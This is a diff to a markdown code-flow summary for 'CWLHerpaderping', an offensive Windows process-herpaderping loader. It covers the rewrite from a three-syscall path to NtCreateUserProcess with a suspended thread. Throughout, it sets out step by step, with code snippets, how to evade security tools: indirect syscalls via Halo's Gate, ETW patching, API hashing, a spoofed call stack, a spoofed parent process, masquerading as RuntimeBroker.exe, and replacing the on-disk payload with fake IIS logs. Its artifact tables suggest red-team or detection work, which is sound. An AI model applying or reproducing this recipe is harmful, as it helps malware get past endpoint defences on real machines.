@@ -1,6 +1,6 @@
 # CWLHerpaderping - Code Flow Summary
 
-This document summarizes the code flow of `CWLHerpaderping`, focusing on how the loader reads a PE payload, creates a ghost process via the **classic 3-syscall herpaderping path** (`NtCreateSection` → `NtCreateProcessEx` → `NtCreateThreadEx`), overwrites the on-disk backing file before the thread runs, and manually injects spoofed process parameters into the remote process via `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` so the ghost appears as `RuntimeBroker.exe`.
+This document summarizes the code flow of `CWLHerpaderping`, focusing on how the loader reads a PE payload, creates a ghost process via **`NtCreateUserProcess` with a suspended primary thread**, overwrites the on-disk backing file before the thread resumes, and passes spoofed process parameters directly via `PS_ATTRIBUTE_LIST` so the ghost appears as `RuntimeBroker.exe`.
 
 ## Source Map
 
@@ -10,7 +10,7 @@ This document summarizes the code flow of `CWLHerpaderping`, focusing on how the
 | Native declarations | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/CWLInc.h` | NT types, PEB structures, function typedefs |
 | API hashing | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/api_hash.h` | DJB2 hash constants, PEB-walk module finder, EAT-walk resolver |
 | Indirect syscall helpers | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/syscall.h` | Halo's Gate SSN resolution, `syscall;ret` gadget finder, runtime stub builder |
-| Stack spoofing | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/StackSpoof.cpp` | Fake return address planted inside `kernel32.dll` before `NtCreateProcessEx` syscall |
+| Stack spoofing | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/StackSpoof.cpp` | Fake return address planted inside `kernel32.dll` before `NtCreateUserProcess` syscall |
 | Obfuscated strings | `../../resources/payloads/process-injection/CWLHerpaderping/CWLHerpaderping/obfstr.h` | Compile-time XOR string obfuscation |
 
 ---
@@ -19,20 +19,18 @@ This document summarizes the code flow of `CWLHerpaderping`, focusing on how the
 
 ### ntdll.dll — Indirect Syscall (Halo's Gate + in-ntdll gadget)
 
-`syscall.h` builds 21-byte runtime stubs for the 5 injection-critical NT APIs. Each stub: `mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11`. The `syscall;ret` gadget (`0F 05 C3`) is located inside ntdll `.text` by scanning PE section bytes — so the kernel sees the syscall as originating from ntdll, bypassing EDR user-mode hooks. SSN is read from the stub's `mov eax` at offset +4; if the stub is hooked (first bytes overwritten), Halo's Gate infers SSN from clean neighbors in the EAT (±16 entries, SSNs are sequential by EAT order).
+`syscall.h` builds **one** 21-byte runtime stub for the single injection-critical API. Stub layout: `mov r10,rcx; mov eax,<SSN>; movabs r11,<gadget>; jmp r11`. The `syscall;ret` gadget (`0F 05 C3`) is located inside ntdll `.text` by scanning PE section bytes — so the kernel sees the syscall as originating from ntdll, bypassing EDR user-mode hooks. SSN is read from the stub's `mov eax` at offset +4; if the stub is hooked (first bytes overwritten), Halo's Gate infers SSN from clean neighbors in the EAT (±16 entries, SSNs are sequential by EAT order).
 
 | API | SSN Source | Purpose | Stage |
 |---|---|---|---|
-| `NtCreateSection` | Halo's Gate on ntdll EAT | Snapshot payload temp file as `SEC_IMAGE` section | 6 |
-| `NtCreateProcessEx` | Halo's Gate on ntdll EAT | Create ghost process from section; PPID via `ParentProcess` handle | 6 |
-| `NtAllocateVirtualMemory` | Halo's Gate on ntdll EAT | Allocate remote memory at 64KB-aligned VA matching local params | 9 |
-| `NtWriteVirtualMemory` (×2) | Halo's Gate on ntdll EAT | Copy process parameters blob; patch `PEB->ProcessParameters` pointer | 9 |
-| `NtCreateThreadEx` | Halo's Gate on ntdll EAT | Create primary thread at payload entry point | 10 |
+| `NtCreateUserProcess` | Halo's Gate on ntdll EAT | Create ghost process + suspended primary thread atomically; image from temp file; PPID via `PS_ATTRIBUTE_PARENT_PROCESS`; process params via `PS_ATTRIBUTE_LIST` | 6 |
 
 Stub pool lifecycle:
-- `InitSyscallPool(hNtdll)` → `VirtualAlloc(PAGE_READWRITE)` allocates pool (8 slots × 21 bytes)
-- `BuildIndirectStub(ssn)` × 5 writes stubs into pool
-- `SealSyscallPool()` → `VirtualProtect(PAGE_EXECUTE_READ)` eliminates RWX window
+- `InitSyscallPool(hNtdll)` → `VirtualAlloc(PAGE_READWRITE)` allocates pool (8 slots × 21 bytes, 1 slot used)
+- `BuildIndirectStub(ssn)` writes 1 stub into pool
+- `SealSyscallPool()` → `VirtualProtect(PAGE_EXECUTE_READ)` eliminates RWX window **before** the stub is called
+
+> **Note:** `api_hash.h` defines hash constants for `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` — these are leftover from a prior implementation and are **not used** by the current code.
 
 ### ntdll.dll — RESOLVE_API (DJB2 EAT walk, no IAT entry)
 
@@ -43,11 +41,8 @@ Stub pool lifecycle:
 | API | DJB2 Hash | Resolution Path | Purpose | Stage |
 |---|---|---|---|---|
 | `EtwEventWrite` | `0x24A8D022` | `RESOLVE_API` → pointer → patch in-place | `VirtualProtect` + `memcpy(\x33\xC0\xC3)` — ETW suppression | 2 |
-| `NtQueryInformationProcess` | `0xD034FC62` | `RESOLVE_API` → direct call | Read ghost `PEB` base address | 8 |
-| `RtlImageNtHeader` | `0xC63A2FA5` | `RESOLVE_API` → direct call | Parse local payload PE headers for `AddressOfEntryPoint` | 8 |
-| `NtReadVirtualMemory` | `0xC24062E3` | `RESOLVE_API` → direct call | Read ghost PEB to get `ImageBaseAddress` | 8 |
-| `RtlCreateProcessParametersEx` | `0x19132CBB` | `RESOLVE_API` → direct call | Build spoofed `RTL_USER_PROCESS_PARAMETERS` (normalized) | 9 |
-| `RtlInitUnicodeString` | `0x29B75F89` | `RESOLVE_API` → direct call (×2) | Initialize `UNICODE_STRING` for `ImagePathName` / `DllPath` | 9 |
+| `RtlCreateProcessParametersEx` | `0x19132CBB` | `RESOLVE_API` → direct call | Build spoofed `RTL_USER_PROCESS_PARAMETERS` (normalized) | 5 |
+| `RtlInitUnicodeString` | `0x29B75F89` | `RESOLVE_API` → direct call (×2) | Initialize `UNICODE_STRING` for `ImagePathName` / `DllPath` | 5 |
 
 ### kernel32.dll / kernelbase.dll — Standard Win32 (PE IAT)
 
@@ -68,9 +63,10 @@ Resolved by the Windows loader at process startup. Names appear in the PE import
 | `VirtualProtect` (stub pool) | kernelbase | Seal stub pool `RW → RX` (`SealSyscallPool`) | 4 |
 | `GetTempPathW` | kernel32 | Resolve `%TEMP%` directory | 5 |
 | `GetTempFileNameW` | kernel32 | Create `HD*.tmp` backing file path | 5 |
-| `CreateFileW` (hTemp) | kernel32 | Open temp file: `GENERIC_READ\|WRITE\|SYNC`, `FILE_SHARE_READ`, `FILE_ATTRIBUTE_HIDDEN`; attribute set at creation before any write or section lock; hold open through `NtCreateSection` | 5 |
+| `CreateFileW` (hTemp, first open) | kernel32 | Create temp file: `GENERIC_READ\|WRITE\|SYNCHRONIZE`, `FILE_SHARE_READ`, `CREATE_ALWAYS`, `FILE_ATTRIBUTE_HIDDEN`; handle **closed** after `FlushFileBuffers` | 5 |
 | `WriteFile` (payload → hTemp) | kernel32 | Write full payload bytes to temp file | 5 |
-| `FlushFileBuffers` (hTemp) | kernel32 | Flush temp file before `NtCreateSection` | 5 |
+| `FlushFileBuffers` (hTemp) | kernel32 | Flush temp file before close | 5 |
+| `CloseHandle` (hTemp, first) | kernel32 | Release temp file handle before `NtCreateUserProcess` | 5 |
 | `CreateToolhelp32Snapshot` | kernel32 | Take process snapshot for PPID candidate search | 6 |
 | `Process32FirstW` / `Process32NextW` | kernel32 | Walk process snapshot entries | 6 |
 | `ProcessIdToSessionId` | kernel32 | Filter Session 0 candidates | 6 |
@@ -79,12 +75,14 @@ Resolved by the Windows loader at process startup. Names appear in the PE import
 | `GetModuleHandleA("kernel32.dll")` | kernel32 | Find kernel32 base for StackSpoof gadget scan | 6 |
 | `GetModuleInformation` | psapi / kernel32 | Get kernel32 `SizeOfImage` for full-image byte scan | 6 |
 | `VirtualQuery` | kernel32 | Verify page is `PAGE_EXECUTE_READ[WRITE]` (fallback gadget path) | 6 |
-| `CloseHandle` (hParent) | kernel32 | Release parent handle after `NtCreateProcessEx` | 6 |
+| `WaitForSingleObject` (hProcess, 0) | kernel32 | Liveness check — detect EDR kill immediately after creation | 6 |
+| `CloseHandle` (hParent) | kernel32 | Release parent handle after `NtCreateUserProcess` | 6 |
+| `CreateFileW` (hTemp, second open) | kernel32 | Re-open temp file `OPEN_EXISTING` for herpaderping overwrite | 7 |
 | `SetFilePointer` (hTemp, 0) | kernel32 | Rewind temp file to start for decoy overwrite | 7 |
 | `WriteFile` (decoy × N) | kernel32 | Write IIS W3SVC log lines in-place | 7 |
 | `FlushFileBuffers` (hTemp) | kernel32 | Flush decoy content before close | 7 |
-| `CloseHandle` (hTemp) | kernel32 | Release temp file handle; on-disk content is now pure decoy | 7 |
-| `CloseHandle` (hSection) | kernel32 | Release section handle after thread launch | 10 |
+| `CloseHandle` (hTemp, second) | kernel32 | Release temp file handle after overwrite | 7 |
+| `ResumeThread` (hThread) | kernel32 | Resume suspended primary thread; ghost begins executing | 8 |
 
 ### CRT — Inline / Statically Linked
 
@@ -95,6 +93,7 @@ Resolved by the Windows loader at process startup. Names appear in the PE import
 | `memcmp` | StackSpoof gadget pattern scan (`EPILOGUE_PATTERN`, `RET_PATTERN`) |
 | `_AddressOfReturnAddress` | Compiler intrinsic — locate return-address slot on stack (StackSpoof) |
 | `wcscpy` / `lstrcpyW` | Build target path strings |
+| `wsprintfW` | Build NT image path `\\??\<tempFile>` for `PS_ATTRIBUTE_IMAGE_NAME` |
 
 ---
 
@@ -117,50 +116,40 @@ wmain()
             -> [#ifdef ENABLE_PAYLOAD_XOR] XOR decode in-place  <- T1027.013
   -> Herpaderping(payloadBuffer, payloadSize)
        -> InitSyscallPool(hNtdll)                        <- VirtualAlloc stub pool (RW)
-       -> INDIRECT_SYSCALL(NtCreateSection)   x1
-       -> INDIRECT_SYSCALL(NtCreateProcessEx) x1
-       -> INDIRECT_SYSCALL(NtAllocateVirtualMemory) x1
-       -> INDIRECT_SYSCALL(NtWriteVirtualMemory) x1
-       -> INDIRECT_SYSCALL(NtCreateThreadEx)  x1
-       -> SealSyscallPool()                              <- stub pool RW -> RX
-       -> GetTempFileNameW (prefix "HD") -> hTemp (SHARE_READ, FILE_ATTRIBUTE_HIDDEN, handle kept open)
-       -> WriteFile(payload -> hTemp) + FlushFileBuffers  <- hTemp stays OPEN (SHARE_READ)
-       -> NtCreateSection(SEC_IMAGE, hTemp)              <- snapshot payload as image section
-            <- kernel runs MmFlushImageSection: blocks NEW writers, pre-held hTemp survives
+       -> INDIRECT_SYSCALL(NtCreateUserProcess)  x1      <- 1 stub built
+       -> SealSyscallPool()                              <- stub pool RW -> RX (before any call)
+       -> RESOLVE_API: RtlCreateProcessParametersEx, RtlInitUnicodeString
+       -> GetTempFileNameW (prefix "HD") -> hTemp (SHARE_READ, FILE_ATTRIBUTE_HIDDEN)
+       -> WriteFile(payload -> hTemp) + FlushFileBuffers
+       -> CloseHandle(hTemp)                             <- handle released; file stays on disk
+       -> wsprintfW(ntImagePath, "\\??\\<tempFile>")     <- NT path for PS_ATTRIBUTE_IMAGE_NAME
+       -> RtlInitUnicodeString x2 (ImagePathName, DllPath)
+       -> RtlCreateProcessParametersEx(RuntimeBroker.exe, NORMALIZED)
        -> GetNonJobParent()                              <- PPID spoof: svchost/wininit Session 0
             -> CreateToolhelp32Snapshot + Process32First/Next
             -> ProcessIdToSessionId (filter Session 0)
             -> OpenProcess(PROCESS_CREATE_PROCESS)
+       -> Build PS_ATTRIBUTE_LIST:
+            Attributes[0]: PS_ATTRIBUTE_IMAGE_NAME  = ntImagePath (NT path to HD*.tmp)
+            Attributes[1]: PS_ATTRIBUTE_PARENT_PROCESS = hParent
        -> [StackSpoof: Activate]
             -> GetModuleHandleA + GetModuleInformation  <- find kernel32 for gadget
             -> scan for "add rsp,0x28; ret" (EPILOGUE_PATTERN) / fallback "ret" + VirtualQuery
             -> _AddressOfReturnAddress -> plant fake return in kernel32
-       -> NtCreateProcessEx(hSection, hParent, Flags=0, InJob=FALSE)  <- indirect syscall
-            <- ghost process created; NO primary thread (natural writable window)
+       -> NtCreateUserProcess(THREAD_CREATE_FLAGS_CREATE_SUSPENDED, processParameters, &attrList)
+            <- ghost process + suspended primary thread created atomically
+            <- image mapped from HD*.tmp; PPID = svchost/wininit; params = RuntimeBroker.exe
        -> [StackSpoof: Deactivate] + CloseHandle(hParent)
+       -> WaitForSingleObject(hProcess, 0)               <- liveness check (abort if EDR killed it)
+       -> CreateFileW(tempFile, OPEN_EXISTING)           <- re-open temp file for overwrite
        -> SetFilePointer(hTemp, 0) + WriteFile loop (IIS log lines) until totalWritten >= payloadSize
-            <- in-place overwrite via pre-held hTemp; active section blocks SetEndOfFile resize
        -> FlushFileBuffers(hTemp) + CloseHandle(hTemp)
-            <- on-disk file is now 100% IIS W3SVC log content; file stays on disk
-       -> NtQueryInformationProcess(ProcessBasicInformation) -> pbi  <- RESOLVE_API, direct call
-       -> GetEntryPoint(hProcess, payload, pbi)
-            -> RESOLVE_API(RtlImageNtHeader): parse local payload -> AddressOfEntryPoint
-            -> RESOLVE_API(NtReadVirtualMemory): read ghost PEB -> ImageBaseAddress
-            -> entryPoint = ImageBaseAddress + AddressOfEntryPoint
-       -> RtlInitUnicodeString(x2: ImagePathName, DllPath)            <- RESOLVE_API
-       -> RtlCreateProcessParametersEx(RuntimeBroker.exe, NORMALIZED) <- RESOLVE_API
-            <- all UNICODE_STRING.pBuffer fields become absolute local VAs
-       -> 64KB alignment: hintBase = (ULONG_PTR)processParameters & ~0xFFFF
-       -> NtAllocateVirtualMemory(hProcess, hint=hintBase, allocSize) <- indirect syscall
-            <- remote allocation lands at same VA as local processParameters
-       -> NtWriteVirtualMemory(hProcess, processParameters, paramSize)  <- indirect syscall
-       -> NtWriteVirtualMemory(hProcess, &PEB->ProcessParameters, &ptr) <- indirect syscall
-       -> NtCreateThreadEx(hProcess, entryPoint)        <- indirect syscall; ghost begins executing
-       -> CloseHandle(hSection)
-            <- temp file stays on disk (active section blocks unlink: STATUS_CANNOT_DELETE 0xC0000121)
+            <- on-disk file is now 100% IIS W3SVC log content
+       -> ResumeThread(hThread)
+            <- ghost process begins executing; on-disk image shows only IIS log
 ```
 
-> **Core point:** The payload enters the ghost process image when `NtCreateSection(SEC_IMAGE)` snapshots the temp file and `NtCreateProcessEx` maps that section into a new address space — no `WriteProcessMemory`. `NtCreateProcessEx` does NOT create a primary thread; this is the natural writable window. Process parameters are injected manually via `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` at the same VA as the local `processParameters` block (64KB-aligned hint), so all absolute `UNICODE_STRING.pBuffer` pointers resolve correctly in the remote process.
+> **Core point:** The payload enters the ghost process image when `NtCreateUserProcess` maps the temp file as the process image and creates a suspended primary thread — no separate `NtCreateSection` or `NtCreateThreadEx` calls. Process parameters (including `ImagePathName = RuntimeBroker.exe`) are passed directly via `PS_ATTRIBUTE_LIST`, so no manual PEB patching is required. The temp file handle is closed before `NtCreateUserProcess`; the herpaderping overwrite re-opens the file after process creation and replaces the content while the thread remains suspended.
 
 ---
 
@@ -206,7 +195,7 @@ Two compile-time helpers reduce static signatures before any runtime behavior:
 | `C:\Windows\System32\RuntimeBroker.exe` | `RtlCreateProcessParametersEx` |
 | `C:\Windows\System32` | `RtlCreateProcessParametersEx` (DllPath) |
 
-In Release builds, `perror` is suppressed via macro (`#ifndef CWLDEBUG` → `#define perror(x) ((void)0)`): all `perror` string arguments (`"[-] Failed to initialize indirect syscall pool"`, etc.) are unreferenced and omitted from `.rdata`. Debug builds (`/p:CWLDebug=1`) retain `perror` output.
+In Release builds, `perror` is suppressed via macro (`#ifndef CWLDEBUG` → `#define perror(x) ((void)0)`): all `perror` string arguments are unreferenced and omitted from `.rdata`. Debug builds (`/p:CWLDebug=1`) retain `perror` output.
 
 **2. `api_hash.h` — API Hash Resolution**
 
@@ -217,13 +206,10 @@ APIs resolved via `RESOLVE_API` (no IAT entry):
 | API | Hash | Used in |
 |---|---|---|
 | `EtwEventWrite` | `0x24A8D022` | `PatchEtw()` |
-| `NtQueryInformationProcess` | `0xD034FC62` | `Herpaderping()` — PEB query |
-| `RtlImageNtHeader` | `0xC63A2FA5` | `GetEntryPoint()` |
-| `NtReadVirtualMemory` | `0xC24062E3` | `GetEntryPoint()` |
 | `RtlCreateProcessParametersEx` | `0x19132CBB` | `Herpaderping()` |
 | `RtlInitUnicodeString` | `0x29B75F89` | `Herpaderping()` |
 
-The 5 injection-critical APIs (`NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) use a separate path: `InitSyscallPool` + `INDIRECT_SYSCALL` (Stage 4), not `RESOLVE_API`.
+The 1 injection-critical API (`NtCreateUserProcess`) uses a separate path: `InitSyscallPool` + `INDIRECT_SYSCALL` (Stage 4), not `RESOLVE_API`.
 
 ---
 
@@ -279,7 +265,7 @@ XOR detail: position-dependent, self-inverse. First byte: `0x4D ('M') ^ 0xA3 = 0
 `InitSyscallPool(hNtdll)` initializes the stub infrastructure using **ntdll alone** — no external API calls except `VirtualAlloc` / `VirtualProtect` (kernelbase):
 
 **Gadget finder (`FindSyscallGadget`):**
-Scans ntdll PE section headers for the `.text` section, then linearly searches for `0F 05 C3` (`syscall; ret`). This address becomes the jump target for all 5 stubs — syscalls appear to originate from ntdll.
+Scans ntdll PE section headers for the `.text` section, then linearly searches for `0F 05 C3` (`syscall; ret`). This address becomes the jump target for the stub — syscalls appear to originate from ntdll.
 
 **SSN resolver (`GetSsnHalosGate`):**
 Reads `mov eax, <SSN>` at byte offset +4 of each ntdll stub. If the stub prologue is hooked (bytes overwritten by EDR), walks neighboring EAT entries (±16) to infer SSN by index delta — Halo's Gate. ntdll syscall stubs are allocated sequentially by SSN, so `stub[i].SSN = stub[i+N].SSN - N`.
@@ -288,58 +274,68 @@ Reads `mov eax, <SSN>` at byte offset +4 of each ntdll stub. If the stub prologu
 Writes a 21-byte stub into the pool: `mov r10,rcx` (Windows ABI) → `mov eax,<SSN>` → `movabs r11,<gadget>` → `jmp r11`.
 
 **SealSyscallPool:**
-`VirtualProtect(pool, SYSCALL_STUB_SIZE * SYSCALL_MAX_STUBS, PAGE_EXECUTE_READ, ...)` — eliminates the RWX window after all stubs are written.
+`VirtualProtect(pool, SYSCALL_STUB_SIZE * SYSCALL_MAX_STUBS, PAGE_EXECUTE_READ, ...)` — eliminates the RWX window. Called **immediately after building the stub and before it is used**, so there is no persistent RWX window at any point during execution.
 
-5 stubs built (in order):
+1 stub built:
 
 | Stub | API | SSN Source |
 |---|---|---|
-| 1 | `NtCreateSection` | Halo's Gate |
-| 2 | `NtCreateProcessEx` | Halo's Gate |
-| 3 | `NtAllocateVirtualMemory` | Halo's Gate |
-| 4 | `NtWriteVirtualMemory` | Halo's Gate |
-| 5 | `NtCreateThreadEx` | Halo's Gate |
+| 1 | `NtCreateUserProcess` | Halo's Gate |
 
 | Artifact | Meaning |
 |---|---|
 | `VirtualAlloc(PAGE_READWRITE)` for small anonymous region (~168 bytes) | Syscall stub pool allocation |
-| `VirtualProtect` on that region → `PAGE_EXECUTE_READ` | Pool sealed; no persistent RWX page |
+| `VirtualProtect` on that region → `PAGE_EXECUTE_READ` | Pool sealed before stub called; no persistent RWX page |
 | Stub bytes at allocated address | `49 89 CA B8 XX XX XX XX 49 BB XX..XX 41 FF E3` — indirect syscall pattern |
 
 ---
 
-## Stage 5 — Temp File Staging
+## Stage 5 — Temp File Staging and Process Parameter Setup
 
-The herpaderping trick requires a legitimate PE on disk **before** section creation, and a pre-held write-capable handle to survive `MmFlushImageSection`.
+### 5a — Temp File Creation
+
+The herpaderping trick requires a legitimate PE on disk **before** `NtCreateUserProcess`. Unlike the classic 3-syscall path, the handle is **not** kept open — it is closed before process creation.
 
 1. `GetTempPathW(MAX_PATH, tempPath)` — resolve `%TEMP%`
 2. `GetTempFileNameW(tempPath, L"HD", 0, tempFile)` — create `HD*.tmp` path
-3. `CreateFileW(tempFile, GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0)` — `FILE_ATTRIBUTE_HIDDEN` set at creation time (before any `WriteFile` or `NtCreateSection`); hold handle open; `FILE_SHARE_READ` only (no `FILE_SHARE_DELETE`)
+3. `CreateFileW(tempFile, GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0)` — `FILE_ATTRIBUTE_HIDDEN` set at creation time
 4. `WriteFile(hTemp, payload, payloadSize, ...)` — write full PE payload
-5. `FlushFileBuffers(hTemp)` — guarantee sector commit before `NtCreateSection`
+5. `FlushFileBuffers(hTemp)` — guarantee sector commit
+6. `CloseHandle(hTemp)` — **handle released**; file remains on disk with PE content
 
-**Handle kept open:** `hTemp` is NOT closed here. `MmFlushImageSection` (called by the kernel when `NtCreateSection(SEC_IMAGE)` is invoked) blocks **new** writers on the file, but existing handles with write access are grandfathered — this is what makes the herpaderping overwrite possible in Stage 7.
+The herpaderping overwrite in Stage 7 re-opens this file as `OPEN_EXISTING` after process creation.
+
+### 5b — NT Path Construction
+
+```cpp
+wsprintfW(ntImagePath, L"\\??\\%s", tempFile);
+```
+
+`NtCreateUserProcess` requires a native NT path (`\??\C:\Users\...\HD*.tmp`) for `PS_ATTRIBUTE_IMAGE_NAME`. The Win32 path from `GetTempFileNameW` is prefixed with `\\??\`.
+
+### 5c — Process Parameters (Masquerade)
+
+```cpp
+pRtlInitUnicodeString(&uTargetFilePath, L"C:\\Windows\\System32\\RuntimeBroker.exe");
+pRtlInitUnicodeString(&uDllPath, L"C:\\Windows\\System32");
+pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath,
+                               NULL, &uTargetFilePath, NULL, NULL, NULL, NULL, NULL,
+                               RTL_USER_PROC_PARAMS_NORMALIZED);
+```
+
+`RTL_USER_PROC_PARAMS_NORMALIZED` flag: all `UNICODE_STRING.pBuffer` fields become absolute virtual addresses. These are passed to `NtCreateUserProcess` via `PS_ATTRIBUTE_LIST`; the kernel copies them into the new process — no manual remote allocation required.
 
 | Artifact | Meaning |
 |---|---|
 | `%TEMP%\HD*.tmp` created with `FILE_ATTRIBUTE_HIDDEN` and valid PE header | Ghost process backing file; hidden from Explorer and basic `dir` output; MFT enumeration (`dir /ah`, `Get-ChildItem -Hidden`, Sysmon EID 11) required to observe |
-| `FlushFileBuffers` on temp file | Guarantees sector commit before image section creation |
-| Handle held open after write (no `CloseHandle`) | Pre-held write access for Stage 7 overwrite |
+| `FlushFileBuffers` on temp file | Guarantees sector commit before close |
+| Handle closed after write | No pre-held write handle; Stage 7 must re-open |
 
 ---
 
-## Stage 6 — Section Creation and Ghost Process
+## Stage 6 — Ghost Process Creation
 
-### 6a — NtCreateSection
-
-```cpp
-pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0,
-                 PAGE_READONLY, SEC_IMAGE, hTemp);  // indirect syscall
-```
-
-`SEC_IMAGE` tells the kernel to treat the file as a PE image. The kernel runs `MmFlushImageSection`, which marks the file as image-mapped — new `CreateFile` attempts without `FILE_SHARE_READ` would fail, but `hTemp` (already open) retains its write permission.
-
-### 6b — PPID Candidate Selection
+### 6a — PPID Candidate Selection
 
 `GetNonJobParent()` enumerates processes and selects a Session 0 target:
 
@@ -351,58 +347,72 @@ CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)
        -> OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid) -> hParent
 ```
 
-Priority: `svchost.exe` (non-PPL, always Session 0, reliably accessible on Server 2022) → fallback `wininit.exe` → fallback `GetCurrentProcess()`.
+Priority: `svchost.exe` (non-PPL, always Session 0) → fallback `wininit.exe` → fallback `GetCurrentProcess()`.
 
-### 6c — StackSpoof Setup
+### 6b — StackSpoof Setup
 
 `StackSpoofer spoofer(OBFSTR("kernel32.dll"))` — constructor runs immediately:
 
-1. `_AddressOfReturnAddress()` — compiler intrinsic; captures return-address slot on current stack frame
+1. `_AddressOfReturnAddress()` — compiler intrinsic; captures `&returnAddress` on current stack frame
 2. `GetModuleHandleA("kernel32.dll")` — get kernel32 base
 3. `GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, ...)` — get `SizeOfImage`
 4. Scan full image for `\x48\x83\xC4\x28\xC3` (`add rsp,0x28; ret` — function epilogue pattern)
 5. Fallback: scan for `\xC3` (`ret`) + `VirtualQuery` to verify `PAGE_EXECUTE_READ[WRITE]`
 6. Store `fakeReturnAddress` = gadget VA inside kernel32
 
-### 6d — NtCreateProcessEx
+### 6c — NtCreateUserProcess
 
 ```
 spoofer.Activate()           <- overwrite return-address slot with kernel32 gadget
-pNtCreateProcessEx(
-    &hProcess,               -> ghost EPROCESS created
-    PROCESS_ALL_ACCESS,
-    NULL,                    <- no ObjectAttributes (anonymous)
-    hParent,                 <- PPID spoof: svchost/wininit Session 0
-    0,                       <- Flags=0: no PS_INHERIT_HANDLES
-    hSection,                <- image section from temp file
-    NULL, NULL,              <- DebugPort, ExceptionPort
-    FALSE                    <- InJob=FALSE: do not join parent job object
+pNtCreateUserProcess(
+    &hProcess, &hThread,
+    PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
+    NULL, NULL,
+    0,                                       <- ProcessFlags=0
+    THREAD_CREATE_FLAGS_CREATE_SUSPENDED,    <- thread starts suspended
+    processParameters,                       <- RuntimeBroker.exe params
+    &createInfo,
+    &attrList                                <- [IMAGE_NAME=HD*.tmp, PARENT=hParent]
 )                            -> indirect syscall; EDR stack walk sees kernel32 origin
 spoofer.Deactivate()         <- restore original return address
 CloseHandle(hParent)
 ```
 
-**No primary thread is created.** This is the key difference from `NtCreateUserProcess` (which is atomic). The ghost EPROCESS exists with its image mapped but no thread — the natural writable window between Stages 6 and 10.
+**Atomic creation:** `NtCreateUserProcess` creates both the process and the primary thread in a single call. The thread starts suspended (`THREAD_CREATE_FLAGS_CREATE_SUSPENDED`) — no intermediate threadless state. This is unlike `NtCreateProcessEx`, which returns a process with no thread.
 
-**Token:** `NtCreateProcessEx` inherits the spoofed parent's (`svchost.exe`) token. Since both the caller and `svchost.exe` run as SYSTEM (via EfsPotato), no `NtSetInformationProcess(ProcessAccessToken)` fixup is needed.
+**Image source:** The kernel maps the process image from the NT path provided in `PS_ATTRIBUTE_IMAGE_NAME` (`\\??\%TEMP%\HD*.tmp`). The payload PE is mapped into the ghost's address space at this point.
+
+**Process parameters:** Passed via `PS_ATTRIBUTE_LIST` → kernel copies them into the new process during `NtCreateUserProcess`. No separate `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` + PEB patch needed.
+
+**Token:** The ghost process inherits the token of the spoofed parent (`svchost.exe`). Since both the caller and `svchost.exe` run as SYSTEM (via EfsPotato), no `NtSetInformationProcess(ProcessAccessToken)` fixup is needed.
+
+### 6d — Liveness Check
+
+```cpp
+if (WaitForSingleObject(hProcess, 0) == WAIT_OBJECT_0) { exit(-1); }
+```
+
+Immediately after `NtCreateUserProcess`, the process is checked for premature termination. EDRs that kill newly created processes via `PsSetCreateProcessNotifyRoutineEx` callbacks will have already acted by this point. If the process is gone, execution aborts cleanly rather than attempting to overwrite or resume a dead process.
 
 | Artifact | Meaning |
 |---|---|
-| `NtCreateSection(SEC_IMAGE)` on `HD*.tmp` | Image section creation; file locked against new writers |
 | `CreateToolhelp32Snapshot` + `Process32First/Next` | Process enumeration before spawning |
 | `OpenProcess(PROCESS_CREATE_PROCESS)` on `svchost.exe` / `wininit.exe` | PPID spoof handle acquired |
 | `GetModuleHandleA` + `GetModuleInformation` + byte scan on kernel32 | StackSpoof gadget search |
-| `NtCreateProcessEx` with `SectionHandle` = `HD*.tmp` section | Ghost process mapped from temp file |
+| `NtCreateUserProcess` with `PS_ATTRIBUTE_IMAGE_NAME` = `HD*.tmp` NT path | Ghost process mapped from temp file; primary thread created suspended |
 | Child PPID = `svchost.exe` / `wininit.exe` | PPID does not reflect real caller |
 | Stack return address in `kernel32.dll` during syscall | StackSpoof active; call origin hidden |
+| `WaitForSingleObject(hProcess, 0)` immediately after creation | EDR kill detection |
 
 ---
 
 ## Stage 7 — File Herpaderping (In-Place Overwrite)
 
-After the ghost process exists but before any thread runs, the original payload bytes on disk are replaced with IIS W3SVC log content using the **pre-held `hTemp`** — no reopen needed.
+After the ghost process exists with a suspended primary thread, the payload bytes on disk are replaced with IIS W3SVC log content. Unlike the classic path (pre-held handle), this implementation **re-opens** the temp file as `OPEN_EXISTING`:
 
 ```cpp
+hTemp = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE,
+                    FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 SetFilePointer(hTemp, 0, NULL, FILE_BEGIN);
 SIZE_T totalWritten = 0;
 int idx = 0;
@@ -419,127 +429,44 @@ FlushFileBuffers(hTemp);
 CloseHandle(hTemp);
 ```
 
-**Why no truncate:** `SetEndOfFile` silently fails while an active `SEC_IMAGE` section is mapped — the kernel blocks resize operations on image-backed files. The loop therefore writes in-place until `totalWritten >= payloadSize`, covering every byte of the original payload. File size on disk does not change (= payloadSize), but all content is replaced.
+**Why re-open succeeds:** The image section mapped by `NtCreateUserProcess` is maintained by the kernel's memory manager independently of the file handle. After the initial `CloseHandle`, no process holds a section lock that prevents re-opening with write access. The `FILE_SHARE_READ` flag on the original open allows this re-open.
